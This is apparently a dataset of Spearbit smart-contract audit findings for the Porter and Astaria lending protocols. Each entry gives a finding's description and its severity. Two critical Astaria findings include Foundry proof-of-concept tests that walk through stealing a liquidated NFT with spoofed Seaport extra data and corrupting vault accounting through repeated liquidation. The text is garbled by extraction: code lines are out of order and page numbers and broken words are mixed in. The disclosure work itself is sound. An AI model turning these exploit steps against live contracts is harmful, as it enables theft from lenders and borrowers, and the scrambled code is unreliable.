case a malicious token and issuer slip through the screening process the protocol can be used by malicious actors to perform mass scam attacks. In such scenario, tokens and issuers would be able to create bonds, sell those anywhere and later on exploit those tokens, leading to loss of user funds. /// @inheritdoc IBondFactory function createBond( string memory name, string memory symbol, uint256 maturity, address paymentToken, address collateralToken, uint256 collateralTokenAmount, uint256 convertibleTokenAmount, uint256 bonds ) external onlyIssuer returns (address clone)", "labels": ["Spearbit", "Porter", "Severity: Informational"]}, {"title": "Incorrect revert message", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf", "body": "error BondBeforeGracePeriodOrPaid() is used to revert when !isAfterGracePeriod() && amountPaid() > 0, which means the bonds is before the grace period and not paid for. Therefore, the error description is incorrect. if (isAfterGracePeriod() || amountUnpaid() == 0) { _; } else { revert BondBeforeGracePeriodOrPaid(); }", "labels": ["Spearbit", "Porter", "Severity: Informational"]}, {"title": "Non-existent bonds naming/symbol restrictions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf", "body": "The issuer can dene any name and symbol during bond creation. Naming is neither enforced nor constructed by the contract and may result in abusive or misleading names which could have a negative impact on the PR of the project. /// @inheritdoc IBondFactory function createBond( string memory name, string memory symbol, uint256 maturity, address paymentToken, address collateralToken, uint256 collateralTokenAmount, uint256 convertibleTokenAmount, uint256 bonds ) external onlyIssuer returns (address clone) A malicious user could hypothetically use arbitrary names to:  Mislead users into thinking they are buying bonds consisting of different tokens.  Use abusive names to discredit the team.  Attempt to exploit the frontend application by injecting arbitrary HTML data. The team had a discussion regarding naming conventions in the past. However, not all the abovementioned scenarios were brought up during that conversation. Therefore, this nding is reported as informational to revisit and estimate its potential impact, or add it as a test case during the web application implementation.", "labels": ["Spearbit", "Porter", "Severity: Informational"]}, {"title": "Needles variable initialization for default values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf", "body": "uint256 variable are initialized to a default value of zero per Solidity docs. Setting a variable to the default value is unnecessary.", "labels": ["Spearbit", "Porter", "Severity: Informational"]}, {"title": "Deationary payment tokens are not handled in the pay() function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf", "body": "The pay() function does not support rebasing/deflationary/inflationary payment tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.", "labels": ["Spearbit", "Porter", "Severity: Informational"]}, {"title": "The extra data (encoded stack) provided to advanced orders to Seaport are not validated properly by the CollateralToken upon callback", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The extra data (encoded stack) provided to advanced orders to Seaport are not validated properly by the CollateralToken upon callback when validateOrder(...) order is called by Seaport. When a stack/lien gets liquidated an auction is created on Seaport with the offerer and zone set as the Col- lateralToken and the order type is full restricted so that the aforementioned call back is performed at the end of fulfilment/matching orders on Seaport. An extra piece of information which needs to be provided by the fulfiller or matcher on Seaport is the extra data which is the encoded stack. The only validation that happens during the call back is the following to make sure that the 1st consideration's token matches with the decoded stack's lien's token: ERC20 paymentToken = ERC20(zoneParameters.consideration[0].token); if (address(paymentToken) != stack.lien.token) { revert InvalidPaymentToken(); } Besides that one does not check that this stack corresponds to the same collateralId with the same lien id. So a bidder on Seaport can take advantage of this and provide a spoofed extra data as follows: 1. The borrower collateralises its NFT token and takes a lien from a public vault 2. The lien expires and a liquidator calls liquidate(...) for the corresponding stack. 3. The bidder creates a private vault and deposits 1 wei worth of WETH into it. 4. The bidder collateralises a fake NFT token and takes a lien with 1 wei worth of WETH as a loan 5. The bidder provides the encoded fake stack from the step 4 as an extra data to settle the auction for the real liquidated lien from step 2 on Seaport. The net result from these steps are that  The original NFT token will be owned by the bidder.  The change in the sum of the ETH and WETH balances of the borrower, liquidator and the bidder would be the original borrowed amount from step 1. (might be off by a few wei due to division errors when calculating the liquidator fees).  The original public vault would not receive its loan amount from the borrower or the auction amount the Seaport liquidation auction. If the borrower, the liquidator and the bidder were the same, this entity would end up with its original NFT token plus the loaned amount from the original public vault. If the liquidator and the bidder were the same, the bidder would end up with the original NFT token and might have to pay around 1 wei due to division errors. The borrower gets to keep its loan. The public vault would not receive the loan or any portion of the amount settled in the liquidation auction. The following diff in the test contracts is needed for the PoC to work: 5 diff --git a/src/test/TestHelpers.t.sol b/src/test/TestHelpers.t.sol index fab5fbd..5c9bfc8 100644 --- a/src/test/TestHelpers.t.sol +++ b/src/test/TestHelpers.t.sol @@ -163,7 +163,6 @@ contract ConsiderationTester is BaseSeaportTest, AmountDeriver { vm.label(address(this), \"testContract\"); } } - contract TestHelpers is Deploy, ConsiderationTester { using CollateralLookup for address; using Strings2 for bytes; @@ -1608,7 +1607,7 @@ contract TestHelpers is Deploy, ConsiderationTester { orders, new CriteriaResolver[](0), fulfillments, address(this) incomingBidder.bidder - + ); } else { consideration.fulfillAdvancedOrder( @@ -1621,7 +1620,7 @@ contract TestHelpers is Deploy, ConsiderationTester { ), new CriteriaResolver[](0), bidderConduits[incomingBidder.bidder].conduitKey, address(this) incomingBidder.bidder - + ); } delete fulfillments; The PoC: forge t --mt testScenario9 --ffi -vvv // add the following test case to // file: src/test/LienTokenSettlementScenarioTest.t.sol // Scenario 8: commitToLien -> liquidate -> settle Seaport auction with mismtaching stack as an ,! extraData function testScenario9() public { TestNFT nft = new TestNFT(1); address tokenContract = address(nft); uint256 tokenId = uint256(0); vm.label(address(this), \"borrowerContract\"); { // create a PublicVault with a 14-day epoch address publicVault = _createPublicVault( strategistOne, strategistTwo, 14 days, 1e17 ); vm.label(publicVault, \"Public Vault\"); // lend 10 ether to the PublicVault as address(1) _lendToVault( Lender({addr: address(1), amountToLend: 10 ether}), payable(publicVault) 6 ); WETH9.balanceOf(publicVault)); emit log_named_uint(\"Public vault WETH balance before commiting to a lien\", ,! emit log_named_uint(\"borrower ETH balance before commiting to a lien\", address(this).balance); emit log_named_uint(\"borrower WETH balance before commiting to a lien\", ,! WETH9.balanceOf(address(this))); // borrow 10 eth against the dummy NFT with tokenId 0 (, ILienToken.Stack memory stack) = _commitToLien({ vault: payable(publicVault), strategist: strategistOne, strategistPK: strategistOnePK, tokenContract: tokenContract, tokenId: tokenId, lienDetails: ILienToken.Details({ maxAmount: 50 ether, rate: (uint256(1e16) * 150) / (365 days), duration: 10 days, maxPotentialDebt: 0 ether, liquidationInitialAsk: 100 ether }), amount: 10 ether }); assertEq( nft.ownerOf(tokenId), address(COLLATERAL_TOKEN), \"The bidder did not receive the collateral token after the auction end.\" ); WETH9.balanceOf(publicVault)); emit log_named_uint(\"Public vault WETH balance after commiting to a lien\", ,! emit log_named_address(\"NFT token owner\", nft.ownerOf(tokenId)); emit log_named_uint(\"borrower ETH balance after commiting to a lien\", address(this).balance); emit log_named_uint(\"borrower WETH balance after commiting to a lien\", ,! WETH9.balanceOf(address(this))); uint256 collateralId = tokenContract.computeId(tokenId); // verify the strategist has no shares minted assertEq( PublicVault(payable(publicVault)).balanceOf(strategistOne), 0, \"Strategist has incorrect share balance\" ); // verify that the borrower has the CollateralTokens assertEq( COLLATERAL_TOKEN.ownerOf(collateralId), address(this), \"CollateralToken not minted to borrower\" ); // fast forward to the end of the lien one vm.warp(block.timestamp + 10 days); address liquidatorOne = vm.addr(0x1195da7051); vm.label(liquidatorOne, \"liquidator 1\"); // liquidate the lien vm.startPrank(liquidatorOne); 7 emit log_named_uint(\"liquidator WETH balance before liquidation\", WETH9.balanceOf(liquidatorOne)); OrderParameters memory listedOrder = _liquidate(stack); vm.stopPrank(); assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralId), liquidatorOne, \"liquidator is not stored in s.collateralLiquidator[collateralId]\" ); // --- start of the attack --- vm.label(bidder, \"bidder\"); vm.startPrank(bidder); TestNFT fakeNFT = new TestNFT(1); address fakeTokenContract = address(fakeNFT); uint256 fakeTokenId = uint256(0); vm.stopPrank(); address privateVault = _createPrivateVault( bidder, bidder ); vm.label(privateVault, \"Fake Private Vault\"); _lendToPrivateVault( PrivateLender({ addr: bidder, amountToLend: 1 wei, token: address(WETH9) }), payable(privateVault) ); vm.startPrank(bidder); // it is important that the fakeStack.lien.token is the same as the original stack's token // below deals 1 wei to the bidder which is also the fakeStack borrower (, ILienToken.Stack memory fakeStack) = _commitToLien({ vault: payable(privateVault), strategist: bidder, strategistPK: bidderPK, tokenContract: fakeTokenContract, tokenId: fakeTokenId, lienDetails: ILienToken.Details({ maxAmount: 1 wei, rate: 1, // needs to be non-zero duration: 1 hours, // s.minLoanDuration maxPotentialDebt: 0 ether, liquidationInitialAsk: 1 wei }), amount: 1 wei }); emit log_named_uint(\"CollateralToken WETH balance before auction end\", ,! WETH9.balanceOf(address(COLLATERAL_TOKEN))); // _bid deals 300 ether to the bidder _bid( Bidder({bidder: bidder, bidderPK: bidderPK}), listedOrder, // order paramters created for the original stack during the liquidation 100 ether, // stack.lien.details.liquidationInitialAsk 8 fakeStack ); emit log_named_uint(\"Public vault WETH balance after auction end\", WETH9.balanceOf(publicVault)); emit log_named_uint(\"borrower WETH balance after auction end\", WETH9.balanceOf(address(this))); emit log_named_uint(\"liquidator WETH balance after auction end\", WETH9.balanceOf(liquidatorOne)); emit log_named_uint(\"bidder WETH balance after auction end\", WETH9.balanceOf(bidder)); emit log_named_uint(\"bidder ETH balance before commiting to a lien\", address(bidder).balance); emit log_named_uint(\"CollateralToken WETH balance after auction end\", ,! emit log_named_address(\"bidder\", bidder); emit log_named_address(\"owner of the original collateral after auction end\", ,! WETH9.balanceOf(address(COLLATERAL_TOKEN))); nft.ownerOf(tokenId)); // _removeLien is not called for collateralId assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralId), liquidatorOne, \"_removeLien is called for collateralId\" ); // WETH balance of the public vault is still 0 even after the auction assertEq( WETH9.balanceOf(publicVault), 0 ); } assertEq( nft.ownerOf(tokenId), bidder, \"The bidder did not receive the collateral token after the auction end.\" ); }", "labels": ["Spearbit", "Astaria", "Severity: Critical Risk"]}, {"title": "AstariaRouter.liquidate(...) can be called multiple times for an expired lien/stack", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The current implementation of the protocol does not have any safeguard around calling Astari- aRouter.liquidate(...) only once for an expired stack/lien. Thus, when a lien expires, multiple adversaries can override many different parameters by calling this endpoint at will in the same block or different blocks till one of the created auctions settles (which might not as one can keep stacking these auctions with some delays to have a never-ending liquidation flow). Here is the list of storage parameters that can be manipulated:  s.collateralLiquidator[stack.lien.collateralId].amountOwed in LienToken: it is possible to keep in- creasing this value if we stack calls to the liquidate(...) with delays.  s.collateralLiquidator[stack.lien.collateralId].liquidator in LienToken: This can be overwritten and would hold the last liquidator's address and so only this liquidator can claim the NFT if the auction its corresponding auction does not settle and also it would receive the liquidation fees.  s.idToUnderlying[params.collateralId].auctionHash in CollateralToken: would hold the last created auction's order hash for the same expired lien backed by the same collateral.  slope in PublicVault: If the lien is taken from a public vault, each call to liquidate(...) would reduce this value. So we can make this slope really small.  s.epochData[epoch].liensOpenForEpoch in PublicVault: If the lien is taken from a public vault, each call to liquidate(...) would reduce this value. So we can make this slope really small or even 0 depends on the rate of this lien and the slope of the vault due to arithmetic underflows.  yIntercept in PublicVault: Mixing the manipulation of the vault's slope and stacking the calls to liqui- date(...) with delays we can also manipulate yIntercept. // add the following test case to: // file: src/test/LienTokenSettlementScenarioTest.t.sol function testScenario8() public { TestNFT nft = new TestNFT(2); address tokenContract = address(nft); uint256 tokenIdOne = uint256(0); uint256 tokenIdTwo = uint256(1); uint256 initialBalance = WETH9.balanceOf(address(this)); // create a PublicVault with a 14-day epoch address publicVault = _createPublicVault( strategistOne, strategistTwo, 14 days, 1e17 ); // lend 20 ether to the PublicVault as address(1) _lendToVault( Lender({addr: address(1), amountToLend: 20 ether}), payable(publicVault) ); uint256 vaultShares = PublicVault(payable(publicVault)).totalSupply(); // borrow 10 eth against the dummy NFT with tokenId 0 (, ILienToken.Stack memory stackOne) = _commitToLien({ vault: payable(publicVault), strategist: strategistOne, strategistPK: strategistOnePK, tokenContract: tokenContract, tokenId: tokenIdOne, lienDetails: ILienToken.Details({ 10 maxAmount: 50 ether, rate: (uint256(1e16) * 150) / (365 days), duration: 10 days, maxPotentialDebt: 0 ether, liquidationInitialAsk: 100 ether }), amount: 10 ether }); // borrow 10 eth against the dummy NFT with tokenId 1 (, ILienToken.Stack memory stackTwo) = _commitToLien({ vault: payable(publicVault), strategist: strategistOne, strategistPK: strategistOnePK, tokenContract: tokenContract, tokenId: tokenIdTwo, lienDetails: ILienToken.Details({ maxAmount: 50 ether, rate: (uint256(1e16) * 150) / (365 days), duration: 10 days, maxPotentialDebt: 0 ether, liquidationInitialAsk: 100 ether }), amount: 10 ether }); uint256 collateralIdOne = tokenContract.computeId(tokenIdOne); uint256 collateralIdTwo = tokenContract.computeId(tokenIdTwo); // verify the strategist has no shares minted assertEq( PublicVault(payable(publicVault)).balanceOf(strategistOne), 0, \"Strategist has incorrect share balance\" ); // verify that the borrower has the CollateralTokens assertEq( COLLATERAL_TOKEN.ownerOf(collateralIdOne), address(this), \"CollateralToken not minted to borrower\" ); assertEq( COLLATERAL_TOKEN.ownerOf(collateralIdTwo), address(this), \"CollateralToken not minted to borrower\" ); // fast forward to the end of the lien one vm.warp(block.timestamp + 10 days); address liquidatorOne = vm.addr(0x1195da7051); address liquidatorTwo = vm.addr(0x1195da7052); vm.label(liquidatorOne, \"liquidator 1\"); vm.label(liquidatorTwo, \"liquidator 2\"); // liquidate the first lien vm.startPrank(liquidatorOne); OrderParameters memory listedOrder = _liquidate(stackOne); vm.stopPrank(); 11 assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralIdOne), liquidatorOne, \"liquidator is not stored in s.collateralLiquidator[collateralId]\" ); // // liquidate the first lien with a different liquidator vm.startPrank(liquidatorTwo); listedOrder = _liquidate(stackOne); vm.stopPrank(); assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralIdOne), liquidatorTwo, \"liquidator is not stored in s.collateralLiquidator[collateralId]\" ); // validate the slope is updated twice for the same expired lien // and so the accounting for the public vault is manipulated assertEq( PublicVault(payable(publicVault)).getSlope(), 0, \"PublicVault slope divergent\" ); // publicVault.storageSlot.epochData[epoch].liensOpenForEpoch is also dfecremented twice // CollateralToken.storageSlot.idToUnderlying[params.collateralId].auctionHash can also be ,! manipulated }", "labels": ["Spearbit", "Astaria", "Severity: Critical Risk"]}, {"title": "maxStrategistFee is incorrectly set in AstariaRouter's constructor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In AstariaRouter's constructor we set the maxStrategistFee as s.maxStrategistFee = uint256(50e17); // 5e18 But in the filing route we check that this value should not be greater than 1e18. 12 maxStrategistFee is supposed to set an upper bound for public vaults's strategist vault fee. When a payment is made for a lien, one calculates the shares to be minted for the strategist based on this value and the interest amount paid: function _handleStrategistInterestReward( VaultData storage s, uint256 interestPaid ) internal virtual { if (VAULT_FEE() != uint256(0) && interestPaid > 0) { uint256 fee = interestPaid.mulWadDown(VAULT_FEE()); uint256 feeInShares = convertToShares(fee); _mint(owner(), feeInShares); } } Note that we are using mulWadDown(...) here: F = j I (cid:1) f 1018k parameter description F f I fee VAULT_FEE() interestPaid so we would want f (cid:20) 1018. Currently, a vault could charge 5 times the interest paid.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "When a vault is shutdown a user can still commit to liens using the vault", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "When a vault is shutdown, one should not be able to take more liens using the funds from this vault. In the commit to lien flow, AstariaRouter fetches the state of the vault 13 ( , address delegate, address owner, , , // s.isShutdown uint256 nonce, bytes32 domainSeparator ) = IVaultImplementation(c.lienRequest.strategy.vault).getState(); But does not use the s.isShutdown flag to stop the flow if it is set to true. When a vault is shutdown we should have: vault endpoint reverts should revert deposit mint redeem withdraw redeemFutureEpoch payment flows liquidation flows commitToLien YES YES NO NO NO NO NO YES // add this test case to // file: src/test/LienTokenSettlementScenarioTest.t.sol // Scenario 12: create vault > shutdown > commitToLien function testScenario12() public { { console2.log(\"--- test private vault shutdown ---\"); uint256 ownerPK = uint256(0xa77ac3); address owner = vm.addr(ownerPK); vm.label(owner, \"owner\"); uint256 lienId; TestNFT nft = new TestNFT(1); address tokenContract = address(nft); uint256 tokenId = uint256(0); address privateVault = _createPrivateVault(owner, owner); vm.label(privateVault, \"privateVault\"); console2.log(\"[+] private vault is created: %s\", privateVault); // lend 1 wei to the privateVault _lendToPrivateVault( PrivateLender({addr: owner, amountToLend: 1 wei, token: address(WETH9)}), payable(privateVault) ); console2.log(\"[+] lent 1 wei to the private vault.\"); console2.log(\"[+] shudown private vault.\"); 14 vm.startPrank(owner); Vault(payable(privateVault)).shutdown(); vm.stopPrank(); assertEq( Vault(payable(privateVault)).getShutdown(), true, \"Private Vault should be shutdown.\" ); // borrow 1 wei against the dummy NFT (lienId, ) = _commitToLien({ vault: payable(privateVault), strategist: owner, strategistPK: ownerPK, tokenContract: tokenContract, tokenId: tokenId, lienDetails: ILienToken.Details({ maxAmount: 1 wei, rate: 1, duration: 1 hours, maxPotentialDebt: 0 ether, liquidationInitialAsk: 1 ether }), amount: 1 wei, revertMessage: \"\" }); console2.log(\"[+] borrowed 1 wei against the private vault.\"); lienId: %s\", lienId); console2.log(\" owner of lienId: %s\\n\\n\", LIEN_TOKEN.ownerOf(lienId)); console2.log(\" assertEq( LIEN_TOKEN.ownerOf(lienId), owner, \"owner should be the owner of the lienId.\" ); } { console2.log(\"--- test public vault shutdown ---\"); uint256 ownerPK = uint256(0xa77ac322); address owner = vm.addr(ownerPK); vm.label(owner, \"owner\"); uint256 lienId; TestNFT nft = new TestNFT(1); address tokenContract = address(nft); uint256 tokenId = uint256(0); address publicVault = _createPublicVault(owner, owner, 14 days); vm.label(publicVault, \"publicVault\"); console2.log(\"[+] public vault is created: %s\", publicVault); // lend 1 wei to the publicVault _lendToVault( Lender({addr: owner, amountToLend: 1 ether}), payable(publicVault) ); 15 console2.log(\"[+] lent 1 ether to the public vault.\"); console2.log(\"[+] shudown public vault.\"); vm.startPrank(owner); Vault(payable(publicVault)).shutdown(); vm.stopPrank(); assertEq( Vault(payable(publicVault)).getShutdown(), true, \"Public Vault should be shutdown.\" ); // borrow 1 wei against the dummy NFT (lienId, ) = _commitToLien({ vault: payable(publicVault), strategist: owner, strategistPK: ownerPK, tokenContract: tokenContract, tokenId: tokenId, lienDetails: ILienToken.Details({ maxAmount: 1 wei, rate: 1, duration: 1 hours, maxPotentialDebt: 0 ether, liquidationInitialAsk: 1 ether }), amount: 1 wei, revertMessage: \"\" }); console2.log(\"[+] borrowed 1 wei against the public vault.\"); console2.log(\" console2.log(\" lienId: %s\", lienId); owner of lienId: %s\", LIEN_TOKEN.ownerOf(lienId)); assertEq( LIEN_TOKEN.ownerOf(lienId), publicVault, \"Public vault should be the owner of the lienId.\" ); } } forge t --mt testScenario12 --ffi -vvv: 16 --- test private vault shutdown --- [+] private vault is created: 0x7BF14E2ad40df80677D356099565a08011B72d66 [+] lent 1 wei to the private vault. [+] shudown private vault. [+] borrowed 1 wei against the private vault. lienId: 78113226609386929237635937490344951966356214732432064308195118046023211325984 owner of lienId: 0x60873Bc6F2C9333b465F60e461cf548EfFc7E6EA --- test public vault shutdown --- [+] public vault is created: 0x5b1A54d097AA8Ce673b6816577752F6dfc10Ddd6 [+] lent 1 ether to the public vault. [+] shudown public vault. [+] borrowed 1 wei against the public vault. lienId: 13217102800774263219074199159187108198090219420208960450275388834853683629020 owner of lienId: 0x5b1A54d097AA8Ce673b6816577752F6dfc10Ddd6", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "transfer(...) function in _issuePayout(...) can be replaced by a direct call", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In the _issuePayout(...) internal function of the VaultImplementation if the asset is WETH the amount is withdrawn from WETH to native tokens and then transfered to the borrower: if (asset() == WETH()) { IWETH9 wethContract = IWETH9(asset()); wethContract.withdraw(newAmount); payable(borrower).transfer(newAmount); } transfer limits the amount of gas shared to the call to the borrower which would prevent executing a complex callback and due to changes in gas prices in EVM it might even break some feature for a potential borrower contract. For the analysis of the flow for both types of vaults please refer to the following issue:  'Storage parameters are updated after a few callback sites to external addresses in the commitToLien(...) flow'", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Storage parameters are updated after a few callback sites to external addresses in the commit- ToLien(...) flow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In the commitToLien(...) flow the following storage parameters are updated after some of the external call back sites when payout is issued or a lien is transferred from a private vault to its owner: 26  collateralStateHash in LienToken: One can potentially re-enter to take another lien using the same col- lateral, but this is not possible since the collateral NFT token is already transferred to the CollateralToken (unless one is dealing with some esoteric NFT token). The createLien(...) requires this parameter to be 0., and that's why a potential re-entrancy can bypass this requirement. | Read re-entrancy: Yes  slope in PublicVault: - | Read re-entrancy: Yes  liensOpenForEpoch in PublicVault: If flash liens are allowed one can re-enter and process the epoch before finishing the commitToLien(...). And so the processed epoch would have open liens even though we would want to make sure this could not happen | Read re-entrancy: Yes The re-entrancies can happen if the vault asset performs a call back to the receiver when transferring tokens (during issuance of payouts). And if one is dealing with WETH, the native token amount is transfer(...) to the borrower. Note in the case of Native tokens if the following recommendation from the below issue is considered the current issue could be of higher risk:  'transfer(...) function in _issuePayout(...) can be replaced by a direct call'", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "UNI_V3Validator fetches spot prices that may lead to price manipulation attacks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "UNI_V3Validator.validateAndParse() checks the state of the Uniswap V3 position. This includes checking the LP value through LiquidityAmounts.getAmountsForLiquidity. //get pool state //get slot 0 (uint160 poolSQ96, , , , , , ) = IUniswapV3PoolState( V3_FACTORY.getPool(token0, token1, fee) ).slot0(); (uint256 amount0, uint256 amount1) = LiquidityAmounts .getAmountsForLiquidity( poolSQ96, TickMath.getSqrtRatioAtTick(tickLower), TickMath.getSqrtRatioAtTick(tickUpper), liquidity );  LiquidityAmounts.sol#L177-L221 When we deep dive into getAmountsForLiquidity, we see three cases. Price is below the range, price is within the range, and price is above the range. 28 function getAmountsForLiquidity( uint160 sqrtRatioX96, uint160 sqrtRatioAX96, uint160 sqrtRatioBX96, uint128 liquidity ) internal pure returns (uint256 amount0, uint256 amount1) { unchecked { if (sqrtRatioAX96 > sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96); if (sqrtRatioX96 <= sqrtRatioAX96) { amount0 = getAmount0ForLiquidity( sqrtRatioAX96, sqrtRatioBX96, liquidity ); } else if (sqrtRatioX96 < sqrtRatioBX96) { amount0 = getAmount0ForLiquidity( sqrtRatioX96, sqrtRatioBX96, liquidity ); amount1 = getAmount1ForLiquidity( sqrtRatioAX96, sqrtRatioX96, liquidity ); } else { amount1 = getAmount1ForLiquidity( sqrtRatioAX96, sqrtRatioBX96, liquidity ); } } } For simplicity, we can break into getAmount1ForLiquidity 29 /// @notice Computes the amount of token1 for a given amount of liquidity and a price range /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary /// @param liquidity The liquidity being valued /// @return amount1 The amount of token1 function getAmount1ForLiquidity( uint160 sqrtRatioAX96, uint160 sqrtRatioBX96, uint128 liquidity ) internal pure returns (uint256 amount1) { unchecked { if (sqrtRatioAX96 > sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96); return FullMathUniswap.mulDiv( liquidity, sqrtRatioBX96 - sqrtRatioAX96, FixedPoint96.Q96 ); } } is calculated as amount = liquidity * (upper price - lower price). When the We find the amount slot0.poolSQ96 is in lp range, the lower price is the slot0.poolSQ96, the closer slot0 is to lowerTick, the smaller the amount1 is. This is vulnerable to price manipulation attacks as IUniswapV3PoolState.slot0.poolSQ96 is effectively the spot price. Attackers can acquire huge funds through flash loans and shift theslot0 by doing large swaps on Uniswap. Assume the following scenario, the strategist sign a lien that allows the borrower to provide ETH-USDC position with > 1,000,000 USDC and borrow 1,000,000 USDC from the vault.  Attacker can first provides 1 ETH worth of lp at price range 2,000,000 ~ 2,000,001.  The attacker borrows flash loan to manipulate the price of the pool and now the slot0.poolSQ96 = sqrt(2,000,000). (ignoring the decimals difference.  getAmountsForLiquidity value the LP positions with the spot price, and find the LP has 1 * 2,000,000 USDC in the position. The attacker borrows 2,000,000  Restoring the price of Uniswap pool and take the profit to repay the flash loan. Note that the project team has stated clearly that UNI_V3Validator will not be used before the audit. This issue is filed to provide information to the codebase.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Users pay protocol fee for interests they do not get", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The PublicVault._handleStrategistInterestReward() function currently charges a protocol fee from minting vault shares, affecting all vault LP participants. However, not every user receives interest payments. Consequently, a scenario may arise where a user deposits funds into the PublicVault before a loan is repaid, resulting in the user paying more in protocol fees than the interest earned. This approach appears to be unfair to certain users, leading to a disproportionate fee structure for those who do not benefit from the interest rewards.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Seaport auctions not compatible with USDT", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "As per ERC20 specification, approve() returns a boolean function approve(address _spender, uint256 _value) public returns (bool success) However, USDT deviates from this standard and it's approve() method doesn't have a return value. Hence, if USDT is used as a payment token, the following line reverts in validateOrder() as it expects return data but doesn't receive it: paymentToken.approve(address(transferProxy), s.LIEN_TOKEN.getOwed(stack));", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Borrowers cannot provide slippage protection parameters when committing to a lien", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "When a borrower commits to a lien, AstariaRouter calls the strategy validator to fetch the lien details (bytes32 leaf, ILienToken.Details memory details) = IStrategyValidator( strategyValidator ).validateAndParse( commitment.lienRequest, msg.sender, commitment.tokenContract, commitment.tokenId ); details include rate, duration, liquidationInitialAsk: struct Details { uint256 maxAmount; uint256 rate; //rate per second uint256 duration; uint256 maxPotentialDebt; // not used anymore uint256 liquidationInitialAsk; } The borrower cannot provide slippage protection parameters to make sure these 3 values cannot enter into some undesired ranges.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "The liquidation's auction starting price is not chosen perfectly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "When a lien is expired and liquidated the starting price for its Seaport auction is chosen as stack.lien.details.liquidationInitialAs. It would make more sense to have the startingPrice to be the maximum of the amount owed up to now and the stack.lien.details.liquidationInitialAsk ps = max(Lin, aowed ) For example if the liquidate(...) endpoint is called way after the lien's expiration time the amount owed might be bigger than the stack.lien.details.liquidationInitialAsk. When a lien is created the protocol checks that stack.lien.details.liquidationInitialAsk is not smaller than the to-be-owed amount at the end of the lien's term. But the lien can keep accruing interest if it is not liquidated right away when it gets expired.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Canceled Seaport auctions can still be claimed by the liquidator", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Canceled auctions can still be claimed by the liquidator if ( s.idToUnderlying[collateralId].auctionHash != s.SEAPORT.getOrderHash(getOrderComponents(params, counterAtLiquidation)) ) { //revert auction params don't match revert InvalidCollateralState( InvalidCollateralStates.INVALID_AUCTION_PARAMS ); } If in the future we would add an authorised endpoint that could call s.SEAPORT.incrementCounter() to cancel all outstanding NFT auctions, the liquidator can call this endpoint liquidatorNFTClaim(..., counterAtLiq- uidation) where counterAtLiquidation is the old counter to claim its NFT after the canceled Seaport auction ends.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "The risk of bad debt is transferred to the non-redeeming shareholders and not the redeeming holders", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Right before a successful epochProcess(), the total assets A equals to + P(s,tl )2U2 a(s, tl ) A = y0 + s(t (cid:0) tlast ) = B + a(s, t) X s2U1 All the parameter values in the below table are considered as just before calling the processEpoch() endpoint unless stated otherwise.  A | totalAssets() |  y0 | yIntercept |  s | slope |  tlast | lasttimestamp used to update y0 or s |  t | block.timestamp |  B | ERC20(asset()).balanceOf(PublicVault), underlying balance of the public vault |  U1 | The set of active liens/stacks owned by the PublicVault, this can be non-empty due to how long the lien durations can be |  U2 | The set of liquidated liens/stacks and their corresponding liquidation timestamp ( tl ) which are owned by the current epoch's WithdrawProxy Wecurr . These liens belong to the current epoch, but their auction ends in the next epoch duration. |  a(s, t) | total amount owned by the stack s up to the timestamp t.  S | totalSupply().  SW | number of shares associated with the current epoch's WithdrawProxy ,currentWithdrawProxy.totalSupply() |  E | currentWithdrawProxy.getExpected(). 35 0 | yIntercept after calling epochProcess().  wr | withdrawReserve this is the value after calling epochProcess().  y 0  tp | last after calling epochProcess().  A0 | totalAssets after calling epochProcess().  Wn | the current epoch's 